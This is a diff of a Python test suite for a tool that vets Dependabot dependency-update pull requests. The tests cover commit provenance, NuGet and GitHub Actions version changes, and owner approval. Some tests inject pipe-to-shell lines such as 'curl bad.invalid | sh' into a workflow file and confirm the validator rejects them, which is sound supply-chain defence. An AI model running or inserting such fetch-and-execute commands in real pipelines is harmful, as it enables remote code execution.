@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 from __future__ import annotations
 
 import json
@@ -10,76 +11,76 @@ from dependency_governance import (
     Assessment,
     GovernanceError,
     classify_ecosystem,
-    compare_versions,
-    event_pull_number,
-    parse_dependabot_metadata,
-    parse_positive_integer,
-    reconcile_independently,
-    render_comment,
-    select_qualification_run,
+    ensure_owner_review_and_approval,
+    has_exact_owner_approval,
+    reconcile_with_base_convergence,
+    request_dependabot_refresh,
     validate_actions_semantic_change,
     validate_config,
-    validate_nuget_manual,
+    validate_nuget_semantic_change,
     validate_provenance,
     validate_signed_metadata,
-    workflow_identity_matches,
 )
 
 ROOT = Path(__file__).resolve().parents[2]
-CONFIG = json.loads(
-    (ROOT / ".github" / "dependency-governance.json").read_text(encoding="utf-8")
+CONFIG = json.loads((ROOT / ".github" / "dependency-governance.json").read_text(encoding="utf-8"))
+
+PROJECT_BEFORE = """<Project Sdk="Microsoft.NET.Sdk">
+  <PropertyGroup>
+    <TargetFramework>net10.0</TargetFramework>
+    <NuGetAudit>true</NuGetAudit>
+  </PropertyGroup>
+  <ItemGroup>
+    <PackageReference Include="coverlet.MTP" Version="10.0.1"><PrivateAssets>all</PrivateAssets></PackageReference>
+    <PackageReference Include="Microsoft.Testing.Extensions.TrxReport" Version="2.4.0"><PrivateAssets>all</PrivateAssets></PackageReference>
+  </ItemGroup>
+</Project>
+"""
+PROJECT_AFTER = PROJECT_BEFORE.replace('Version="10.0.1"', 'Version="10.1.0"').replace(
+    'Version="2.4.0"', 'Version="2.4.1"'
 )
+LOCK_BEFORE = json.dumps({"version": 2, "dependencies": {"net10.0": {
+    "coverlet.MTP": {"type": "Direct", "requested": "[10.0.1, )", "resolved": "10.0.1"},
+    "Microsoft.Testing.Extensions.TrxReport": {"type": "Direct", "requested": "[2.4.0, )", "resolved": "2.4.0"},
+    "Microsoft.Testing.Platform": {"type": "Transitive", "resolved": "2.4.0"},
+}}})
+LOCK_AFTER = json.dumps({"version": 2, "dependencies": {"net10.0": {
+    "coverlet.MTP": {"type": "Direct", "requested": "[10.1.0, )", "resolved": "10.1.0",
+                     "dependencies": {"Microsoft.Testing.Platform": "2.4.1"}},
+    "Microsoft.Testing.Extensions.TrxReport": {"type": "Direct", "requested": "[2.4.1, )", "resolved": "2.4.1"},
+    "Microsoft.Testing.Platform": {"type": "Transitive", "resolved": "2.4.1"},
+}}})
+SIGNED_NUGET = [
+    {"name": "coverlet.MTP", "version": "10.1.0", "updateType": "version-update:semver-minor"},
+    {"name": "Microsoft.Testing.Extensions.TrxReport", "version": "2.4.1", "updateType": "version-update:semver-patch"},
+]
 
 
 def canonical_fixture() -> tuple[str, str, dict, dict]:
-    base_sha = "a" * 40
-    head_sha = "b" * 40
+    base_sha, head_sha = "a" * 40, "b" * 40
     pull = {
-        "number": 54,
-        "state": "open",
-        "draft": False,
-        "created_at": "2026-09-01T12:00:00Z",
-        "commits": 1,
-        "changed_files": 1,
-        "labels": [],
+        "number": 64, "state": "open", "draft": False, "created_at": "2026-10-03T12:00:00Z",
+        "commits": 1, "changed_files": 2, "labels": [],
         "user": {"login": CONFIG["botLogin"], "id": CONFIG["botUserId"]},
-        "base": {
-            "ref": CONFIG["baseBranch"],
-            "sha": base_sha,
-            "repo": {"full_name": "o/r"},
-        },
-        "head": {
-            "ref": "dependabot/github_actions/routine-actions",
-            "sha": head_sha,
-            "repo": {"full_name": "o/r"},
-        },
+        "base": {"ref": "main", "sha": base_sha, "repo": {"full_name": "portyu9/fixture"}},
+        "head": {"ref": "dependabot/nuget/routine-dependencies", "sha": head_sha,
+                 "repo": {"full_name": "portyu9/fixture"}},
     }
     commit = {
         "sha": head_sha,
         "author": {"login": CONFIG["botLogin"], "id": CONFIG["botUserId"]},
         "committer": {"login": CONFIG["trustedCommitterLogin"]},
         "commit": {
-            "author": {
-                "name": CONFIG["botLogin"],
-                "email": CONFIG["botAuthorEmail"],
-            },
-            "committer": {
-                "name": CONFIG["gitCommitterName"],
-                "email": CONFIG["gitCommitterEmail"],
-            },
-            "verification": {
-                "verified": True,
-                "reason": "valid",
-                "signature": "fixture-signature",
-            },
+            "author": {"name": CONFIG["botLogin"], "email": CONFIG["botAuthorEmail"]},
+            "committer": {"name": CONFIG["gitCommitterName"], "email": CONFIG["gitCommitterEmail"]},
+            "verification": {"verified": True, "reason": "valid", "signature": "fixture"},
             "message": (
-                "deps(deps): bump actions/checkout\n\n---\nupdated-dependencies:\n"
-                "- dependency-name: actions/checkout\n"
-                "  dependency-version: '7.0.2'\n"
-                "  dependency-type: direct:production\n"
-                "  update-type: version-update:semver-patch\n"
-                "...\n\n"
-                + CONFIG["signedOffBy"]
+                "deps: bump routine dependencies\n\n---\nupdated-dependencies:\n"
+                "- dependency-name: coverlet.MTP\n  dependency-version: 10.1.0\n"
+                "  dependency-type: direct:production\n  update-type: version-update:semver-minor\n"
+                "- dependency-name: Microsoft.Testing.Extensions.TrxReport\n  dependency-version: 2.4.1\n"
+                "  dependency-type: direct:production\n  update-type: version-update:semver-patch\n"
+                "...\n\n" + CONFIG["signedOffBy"]
             ),
         },
         "parents": [{"sha": base_sha}],
@@ -87,307 +88,167 @@ def canonical_fixture() -> tuple[str, str, dict, dict]:
     return base_sha, head_sha, pull, commit
 
 
+class OwnerApi:
+    def __init__(self, login: str = "portyu9", user_id: int = 35150859) -> None:
+        self.login, self.user_id = login, user_id
+        self.comments: list[dict] = []
+        self.reviews: list[dict] = []
+
+    def get(self, path: str):
+        if path == "https://api.github.com/user":
+            return {"login": self.login, "id": self.user_id}
+        raise AssertionError(path)
+
+    def paginate(self, path: str, selector: str | None = None):
+        del selector
+        if path.endswith("/comments"):
+            return list(self.comments)
+        if path.endswith("/reviews"):
+            return list(self.reviews)
+        raise AssertionError(path)
+
+    def post(self, path: str, payload: dict):
+        user = {"login": self.login, "id": self.user_id}
+        if path.endswith("/comments"):
+            self.comments.append({"body": payload["body"], "user": user})
+            return {}
+        if path.endswith("/reviews"):
+            self.reviews.append({"state": "APPROVED", "commit_id": payload["commit_id"],
+                                 "body": payload["body"], "user": user})
+            return {}
+        raise AssertionError(path)
+
+
 class DependencyGovernanceTests(unittest.TestCase):
-    def test_config_is_fail_closed(self) -> None:
+    def test_config_is_owner_bound_and_rejects_major_policy(self) -> None:
         self.assertEqual(validate_config(CONFIG), [])
-        major = {
-            **CONFIG,
-            "allowedActionUpdateTypes": [
-                *CONFIG["allowedActionUpdateTypes"],
-                "version-update:semver-major",
-            ],
-        }
-        self.assertTrue(validate_config(major))
-        self.assertTrue(validate_config({**CONFIG, "manualReviewPaths": []}))
+        self.assertTrue(validate_config({**CONFIG, "ownerApprovalRequired": False}))
+        bad = json.loads(json.dumps(CONFIG))
+        bad["ecosystems"]["nuget"]["allowedUpdateTypes"].append("version-update:semver-major")
+        self.assertTrue(validate_config(bad))
 
-    def test_positive_integer_parser(self) -> None:
-        self.assertEqual(parse_positive_integer("54"), 54)
-        for value in ("0", "-1", "1.5", "abc", "9007199254740992"):
-            with self.assertRaises(GovernanceError):
-                parse_positive_integer(value)
-
-    def test_metadata_parser(self) -> None:
-        _, _, _, commit = canonical_fixture()
-        metadata = parse_dependabot_metadata(commit["commit"]["message"])
-        self.assertEqual(metadata[0]["name"], "actions/checkout")
-        self.assertEqual(metadata[0]["updateType"], "version-update:semver-patch")
-
-    def test_signed_metadata_requires_dependency_records(self) -> None:
-        _, _, _, commit = canonical_fixture()
+    def test_provenance_metadata_and_stale_base_contract(self) -> None:
+        base, _, pull, commit = canonical_fixture()
+        valid = validate_provenance(
+            pull, [commit], base, CONFIG, now=datetime(2026, 10, 4, 12, tzinfo=timezone.utc)
+        )
+        self.assertTrue(valid["eligible"], valid["reasons"])
         self.assertTrue(validate_signed_metadata(commit)["eligible"])
-        self.assertFalse(
-            validate_signed_metadata({"commit": {"message": CONFIG["signedOffBy"]}})[
-                "eligible"
-            ]
-        )
-
-    def test_provenance_accepts_only_canonical_untouched_dependabot_commit(self) -> None:
-        base, _, pull, commit = canonical_fixture()
-        result = validate_provenance(
-            pull,
-            [commit],
-            base,
-            CONFIG,
-            now=datetime(2026, 9, 2, 12, tzinfo=timezone.utc),
-        )
-        self.assertTrue(result["eligible"], result["reasons"])
-
-    def test_provenance_rejects_spoofed_bot_identity(self) -> None:
-        base, _, pull, commit = canonical_fixture()
-        commit = json.loads(json.dumps(commit))
-        commit["author"]["id"] = 123
-        commit["commit"]["author"]["email"] = "dependabot[bot]@example.invalid"
-        result = validate_provenance(
-            pull,
-            [commit],
-            base,
-            CONFIG,
-            now=datetime(2026, 9, 2, 12, tzinfo=timezone.utc),
-        )
-        self.assertFalse(result["eligible"])
-        self.assertRegex("\n".join(result["reasons"]), r"numeric identity|author email")
-
-    def test_provenance_rejects_non_github_materialization_and_invalid_signature(self) -> None:
-        base, _, pull, commit = canonical_fixture()
-        commit = json.loads(json.dumps(commit))
-        commit["committer"]["login"] = "someone"
-        commit["commit"]["verification"]["reason"] = "unknown_key"
-        result = validate_provenance(
-            pull,
-            [commit],
-            base,
-            CONFIG,
-            now=datetime(2026, 9, 2, 12, tzinfo=timezone.utc),
-        )
-        self.assertFalse(result["eligible"])
-        self.assertRegex("\n".join(result["reasons"]), r"materialized|signature")
-
-    def test_provenance_rejects_human_second_commit_and_stale_base(self) -> None:
-        base, _, pull, commit = canonical_fixture()
-        pull2 = json.loads(json.dumps(pull))
-        pull2["commits"] = 2
-        result = validate_provenance(
-            pull2,
-            [commit, {"sha": "c" * 40}],
-            base,
-            CONFIG,
-            now=datetime(2026, 9, 2, 12, tzinfo=timezone.utc),
-        )
-        self.assertFalse(result["eligible"])
         stale = validate_provenance(
-            pull,
-            [commit],
-            "d" * 40,
-            CONFIG,
-            now=datetime(2026, 9, 2, 12, tzinfo=timezone.utc),
+            pull, [commit], "c" * 40, CONFIG, now=datetime(2026, 10, 4, 12, tzinfo=timezone.utc)
         )
-        self.assertFalse(stale["eligible"])
-
-    def test_provenance_rejects_age_and_manual_review_label(self) -> None:
-        base, _, pull, commit = canonical_fixture()
-        old = json.loads(json.dumps(pull))
-        old["created_at"] = "2026-08-01T12:00:00Z"
-        labeled = json.loads(json.dumps(pull))
-        labeled["labels"] = [{"name": "manual-review"}]
-        now = datetime(2026, 9, 2, 12, tzinfo=timezone.utc)
-        self.assertFalse(validate_provenance(old, [commit], base, CONFIG, now=now)["eligible"])
-        self.assertFalse(
-            validate_provenance(labeled, [commit], base, CONFIG, now=now)["eligible"]
-        )
+        self.assertEqual(stale["reasons"], ["PR is not rebased directly on the current base branch head"])
 
     def test_ecosystem_classification_is_exact(self) -> None:
-        self.assertEqual(
-            classify_ecosystem([{"filename": "UiTests.csproj"}], CONFIG), "nuget"
-        )
-        self.assertEqual(
-            classify_ecosystem([{"filename": ".github/workflows/ci.yml"}], CONFIG),
-            "github-actions",
-        )
-        self.assertEqual(
-            classify_ecosystem(
-                [{"filename": "UiTests.csproj"}, {"filename": "README.md"}], CONFIG
-            ),
-            "unknown",
-        )
+        self.assertEqual(classify_ecosystem(
+            [{"filename": "UiTests.csproj"}, {"filename": "packages.lock.json"}], CONFIG
+        ), "nuget")
+        self.assertEqual(classify_ecosystem(
+            [{"filename": ".github/workflows/security.yml"}], CONFIG
+        ), "github-actions")
+        self.assertEqual(classify_ecosystem(
+            [{"filename": "UiTests.csproj"}, {"filename": "README.md"}], CONFIG
+        ), "unknown")
 
-    def test_nuget_is_deliberately_manual_due_to_project_and_lock_policy_scope(self) -> None:
-        result = validate_nuget_manual(CONFIG)
-        self.assertFalse(result["eligible"])
-        self.assertIn("target-framework, restore-lock, NuGet audit", result["reasons"][0])
-
-    def test_action_line_requires_immutable_sha_and_version_annotation(self) -> None:
-        good = "      - uses: actions/checkout@" + "a" * 40 + " # v7.0.1"
-        self.assertIsNotNone(ACTION_LINE.fullmatch(good))
-        self.assertIsNone(ACTION_LINE.fullmatch("      - uses: actions/checkout@v7"))
-        self.assertIsNone(ACTION_LINE.fullmatch("      - uses: ./local-action"))
-
-    def test_actions_patch_update_is_eligible(self) -> None:
-        file = ".github/workflows/ci.yml"
-        before = "steps:\n  - uses: actions/checkout@" + "a" * 40 + " # v7.0.1\n"
-        after = "steps:\n  - uses: actions/checkout@" + "b" * 40 + " # v7.0.2\n"
-        metadata = [
-            {
-                "name": "actions/checkout",
-                "version": "7.0.2",
-                "updateType": "version-update:semver-patch",
-            }
-        ]
-        result = validate_actions_semantic_change(
-            [{"filename": file}], {file: before}, {file: after}, metadata, CONFIG
+    def test_nuget_group_is_semantically_eligible(self) -> None:
+        result = validate_nuget_semantic_change(
+            PROJECT_BEFORE, PROJECT_AFTER, LOCK_BEFORE, LOCK_AFTER, SIGNED_NUGET, CONFIG
         )
         self.assertTrue(result["eligible"], result["reasons"])
+        self.assertEqual({item["name"] for item in result["changes"]},
+                         {item["name"] for item in SIGNED_NUGET})
 
-    def test_actions_major_and_non_uses_mutation_are_blocked(self) -> None:
-        file = ".github/workflows/ci.yml"
-        before = (
-            "steps:\n  - uses: actions/checkout@"
-            + "a" * 40
-            + " # v7.0.1\n  - run: echo safe\n"
-        )
-        major = (
-            "steps:\n  - uses: actions/checkout@"
-            + "b" * 40
-            + " # v8.0.0\n  - run: echo safe\n"
-        )
-        metadata = [
-            {
-                "name": "actions/checkout",
-                "version": "8.0.0",
-                "updateType": "version-update:semver-major",
-            }
-        ]
+    def test_nuget_policy_unsigned_and_major_mutations_are_blocked(self) -> None:
+        policy = PROJECT_AFTER.replace("<NuGetAudit>true</NuGetAudit>", "<NuGetAudit>false</NuGetAudit>")
+        self.assertFalse(validate_nuget_semantic_change(
+            PROJECT_BEFORE, policy, LOCK_BEFORE, LOCK_AFTER, SIGNED_NUGET, CONFIG
+        )["eligible"])
+        self.assertFalse(validate_nuget_semantic_change(
+            PROJECT_BEFORE, PROJECT_AFTER, LOCK_BEFORE, LOCK_AFTER, SIGNED_NUGET[:1], CONFIG
+        )["eligible"])
+        major_project = PROJECT_BEFORE.replace('Version="10.0.1"', 'Version="11.0.0"')
+        major_lock = LOCK_BEFORE.replace("10.0.1", "11.0.0")
+        major_meta = [{"name": "coverlet.MTP", "version": "11.0.0",
+                       "updateType": "version-update:semver-major"}]
+        self.assertFalse(validate_nuget_semantic_change(
+            PROJECT_BEFORE, major_project, LOCK_BEFORE, major_lock, major_meta, CONFIG
+        )["eligible"])
+
+    def test_protected_security_workflow_allows_only_signed_action_pin_change(self) -> None:
+        path = ".github/workflows/security.yml"
+        before = "      - name: Analyze\n        uses: github/codeql-action/analyze@" + "a" * 40 + " # v4.38.0\n"
+        after = "      - name: Analyze\n        uses: github/codeql-action/analyze@" + "b" * 40 + " # v4.38.2\n"
+        metadata = [{"name": "github/codeql-action/analyze", "version": "4.38.2",
+                     "updateType": "version-update:semver-patch"}]
         result = validate_actions_semantic_change(
-            [{"filename": file}], {file: before}, {file: major}, metadata, CONFIG
+            [{"filename": path}], {path: before}, {path: after}, metadata, CONFIG
         )
-        self.assertFalse(result["eligible"])
-        mutated = major.replace("echo safe", "curl example.invalid | sh")
-        result = validate_actions_semantic_change(
-            [{"filename": file}], {file: before}, {file: mutated}, metadata, CONFIG
+        self.assertTrue(result["eligible"], result["reasons"])
+        self.assertIsNotNone(ACTION_LINE.fullmatch(
+            "        uses: github/codeql-action/analyze@" + "b" * 40 + " # v4.38.2"
+        ))
+        mutated = after + "      - run: curl bad.invalid | sh\n"
+        self.assertFalse(validate_actions_semantic_change(
+            [{"filename": path}], {path: before}, {path: mutated}, metadata, CONFIG
+        )["eligible"])
+
+    def test_owner_refresh_is_idempotent_and_owner_approval_is_exact_head(self) -> None:
+        base, head, pull, commit = canonical_fixture()
+        stale = validate_provenance(
+            pull, [commit], "c" * 40, CONFIG, now=datetime(2026, 10, 4, 12, tzinfo=timezone.utc)
         )
-        self.assertFalse(result["eligible"])
-        self.assertIn("outside an immutable uses reference", "\n".join(result["reasons"]))
-
-    def test_security_and_governance_workflows_are_manual_control_plane(self) -> None:
-        for file in (
-            ".github/workflows/security.yml",
-            ".github/workflows/dependency-governance.yml",
-        ):
-            before = "steps:\n  - uses: actions/checkout@" + "a" * 40 + " # v7.0.1\n"
-            after = "steps:\n  - uses: actions/checkout@" + "b" * 40 + " # v7.0.2\n"
-            metadata = [
-                {
-                    "name": "actions/checkout",
-                    "version": "7.0.2",
-                    "updateType": "version-update:semver-patch",
-                }
-            ]
-            result = validate_actions_semantic_change(
-                [{"filename": file}], {file: before}, {file: after}, metadata, CONFIG
-            )
-            self.assertFalse(result["eligible"])
-            self.assertIn("control plane", "\n".join(result["reasons"]))
-
-    def test_version_comparison_treats_zero_minor_as_breaking_risk(self) -> None:
-        self.assertEqual(compare_versions("7.0.1", "7.0.2"), "patch")
-        self.assertEqual(compare_versions("7.0.1", "7.1.0"), "minor")
-        self.assertEqual(compare_versions("7.0.1", "8.0.0"), "major")
-        self.assertEqual(compare_versions("0.36.0", "0.37.0"), "major-risk")
-        self.assertEqual(compare_versions("7.0.1", "6.9.9"), "downgrade")
-
-    def test_workflow_identity_binds_name_path_event_head_branch_and_optional_pr(self) -> None:
-        _, head, pull, _ = canonical_fixture()
-        requirement = CONFIG["requiredWorkflows"][0]
-        run = {
-            "id": 1,
-            "name": requirement["workflow"],
-            "path": f".github/workflows/{requirement['file']}",
-            "event": "pull_request",
-            "head_sha": head,
-            "head_branch": pull["head"]["ref"],
-            "pull_requests": [],
-            "updated_at": "2026-09-02T10:00:00Z",
-        }
-        self.assertTrue(workflow_identity_matches(run, pull, requirement))
-        self.assertTrue(
-            workflow_identity_matches(
-                {**run, "pull_requests": [{"number": pull["number"]}]}, pull, requirement
-            )
+        stale_assessment = Assessment(
+            pull, "c" * 40, [{"filename": "UiTests.csproj"}], "nuget", stale,
+            {"eligible": True, "reasons": [], "metadata": SIGNED_NUGET},
+            {"eligible": False, "reasons": [], "changes": []}, None,
         )
-        for mutation in (
-            {"name": "fake"},
-            {"path": ".github/workflows/fake.yml"},
-            {"event": "push"},
-            {"head_sha": "c" * 40},
-            {"head_branch": "dependabot/other"},
-            {"pull_requests": [{"number": 999}]},
-        ):
-            self.assertFalse(workflow_identity_matches({**run, **mutation}, pull, requirement))
-        newer_wrong = {
-            **run,
-            "id": 2,
-            "path": ".github/workflows/fake.yml",
-            "updated_at": "2026-09-02T11:00:00Z",
-        }
-        self.assertEqual(select_qualification_run([newer_wrong, run], pull, requirement)["id"], 1)
+        owner = OwnerApi()
+        self.assertTrue(request_dependabot_refresh(owner, stale_assessment, CONFIG))
+        self.assertIn("@dependabot rebase", owner.comments[-1]["body"])
+        count = len(owner.comments)
+        self.assertTrue(request_dependabot_refresh(owner, stale_assessment, CONFIG))
+        self.assertEqual(len(owner.comments), count)
 
-    def test_manual_dispatch_input_is_strict(self) -> None:
-        self.assertEqual(
-            event_pull_number({"inputs": {"pr-number": "54"}}, "workflow_dispatch"), 54
+        qualified = Assessment(
+            pull, base, [], "nuget", {"eligible": True, "reasons": []},
+            {"eligible": True, "reasons": [], "metadata": SIGNED_NUGET},
+            {"eligible": True, "reasons": [], "changes": []},
+            {"allSuccess": True, "qualifications": []},
         )
-        for bad in ("0", "-1", "1.2", "nope"):
-            with self.assertRaises(GovernanceError):
-                event_pull_number({"inputs": {"pr-number": bad}}, "workflow_dispatch")
+        ensure_owner_review_and_approval(owner, qualified, CONFIG)
+        self.assertTrue(has_exact_owner_approval(owner, pull["number"], head, CONFIG))
+        with self.assertRaises(GovernanceError):
+            ensure_owner_review_and_approval(OwnerApi("github-actions[bot]", 41898282), qualified, CONFIG)
 
-    def test_schedule_reconciliation_isolates_failures(self) -> None:
-        pulls = [{"number": 1}, {"number": 2}, {"number": 3}]
-        visited: list[int] = []
+    def test_base_convergence_revisits_remaining_pr_after_merge(self) -> None:
+        state = {"merged": False}
+        visits: list[int] = []
 
-        def processor(pull: dict) -> str:
-            visited.append(pull["number"])
-            if pull["number"] == 2:
-                raise RuntimeError("boom")
-            return "ok"
+        def list_pulls() -> list[dict]:
+            return [{"number": 2}] if state["merged"] else [{"number": 1}, {"number": 2}]
 
-        results, failures = reconcile_independently(pulls, processor)
-        self.assertEqual(visited, [1, 2, 3])
-        self.assertEqual([number for number, _ in results], [1, 3])
-        self.assertEqual(failures, [(2, "boom")])
+        def processor(pull: dict) -> dict:
+            visits.append(pull["number"])
+            if pull["number"] == 1 and not state["merged"]:
+                state["merged"] = True
+                return {"merged": True}
+            return {"merged": False}
 
-    def test_comment_documents_safety_boundary(self) -> None:
-        base, _, pull, commit = canonical_fixture()
-        assessment = Assessment(
-            pull=pull,
-            base_sha=base,
-            files=[{"filename": "UiTests.csproj"}],
-            ecosystem="nuget",
-            provenance={"eligible": True, "reasons": [], "commit": commit},
-            metadata={"eligible": True, "reasons": [], "metadata": []},
-            semantic=validate_nuget_manual(CONFIG),
-            qualification={
-                "allSuccess": False,
-                "anyFailed": False,
-                "qualifications": [
-                    {**item, "state": "not-evaluated", "runId": None}
-                    for item in CONFIG["requiredWorkflows"]
-                ],
-            },
-        )
-        body = render_comment(assessment, CONFIG)
-        self.assertIn("never regenerates Python locks", body)
-        self.assertIn("MANUAL / WAIT", body)
+        _, failures, passes = reconcile_with_base_convergence(list_pulls, processor)
+        self.assertEqual(failures, [])
+        self.assertGreaterEqual(passes, 2)
+        self.assertEqual(visits, [1, 2])
 
-    def test_privileged_workflow_never_checks_out_dependabot_head(self) -> None:
-        workflow = (
-            ROOT / ".github" / "workflows" / "dependency-governance.yml"
-        ).read_text(encoding="utf-8")
-        self.assertIn("pull_request_target:", workflow)
-        self.assertIn("workflow_run:", workflow)
-        self.assertIn("schedule:", workflow)
-        self.assertIn("ref: ${{ github.event.repository.default_branch }}", workflow)
-        self.assertIn("persist-credentials: false", workflow)
+    def test_privileged_workflow_wiring(self) -> None:
+        workflow = (ROOT / ".github" / "workflows" / "dependency-governance.yml").read_text(encoding="utf-8")
+        self.assertIn("push:", workflow)
+        self.assertIn("cron: '17 * * * *'", workflow)
+        self.assertIn("DEPENDABOT_OWNER_TOKEN", workflow)
+        self.assertIn("checks: read", workflow)
+        self.assertIn("statuses: read", workflow)
+        self.assertIn("ref: $" + "{{ github.event.repository.default_branch }}", workflow)
+        self.assertIn("'reconcile' }}", workflow)
         self.assertNotRegex(workflow, r"ref:\s*\$\{\{\s*github\.event\.pull_request\.head")
-        self.assertNotRegex(workflow, r"ref:\s*\$\{\{\s*github\.event\.workflow_run\.head_sha")
-        self.assertIn("'self-test' || 'reconcile'", workflow)
 
 
 if __name__ == "__main__":
